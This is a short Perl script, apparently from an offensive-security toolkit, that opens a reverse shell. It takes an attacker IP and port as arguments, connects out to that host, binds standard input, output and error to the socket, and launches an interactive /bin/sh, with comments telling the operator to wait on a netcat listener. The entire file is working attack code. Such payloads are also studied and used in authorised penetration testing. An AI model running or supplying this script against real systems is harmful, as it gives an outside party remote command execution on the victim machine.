#!/usr/bin/env perl

# Argument 1 = attacker ip, Argument 2 = attacker port
# The machine being connected to should be listening using netcat, or similar

use Socket;
$i=$ARGV[0];
$p=$ARGV[1];
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
};
